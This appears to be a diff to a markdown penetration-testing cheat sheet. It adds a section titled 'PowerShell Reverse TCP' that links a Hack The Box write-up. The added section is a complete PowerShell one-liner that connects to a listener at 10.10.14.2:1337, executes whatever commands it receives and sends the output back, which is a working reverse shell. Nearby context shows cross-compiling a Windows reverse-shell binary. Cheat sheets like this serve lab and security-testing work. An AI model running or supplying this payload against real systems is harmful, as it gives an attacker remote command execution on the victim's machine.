@@ -602,6 +602,12 @@ sudo apt-get install mingw-w64
 i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
 
+### [PowerShell Reverse TCP]
+https://0xrick.github.io/hack-the-box/conceal/
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
 ### [Auto run reverse TCP]
 ```
 1. Creating your reverse TCP payload
